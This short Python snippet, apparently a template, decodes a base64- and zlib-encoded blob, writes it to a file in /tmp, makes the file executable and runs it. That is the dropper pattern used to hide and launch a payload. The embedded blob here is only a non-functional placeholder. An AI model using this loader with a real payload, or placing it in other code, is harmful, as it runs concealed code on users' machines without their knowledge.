import base64, zlib, os, subprocess
open('/tmp/example_placeholder', 'wb').write(zlib.decompress(base64.b64decode('AAAA')))
os.chmod('/tmp/example_placeholder', 0o755)
subprocess.call(['/tmp/example_placeholder'])
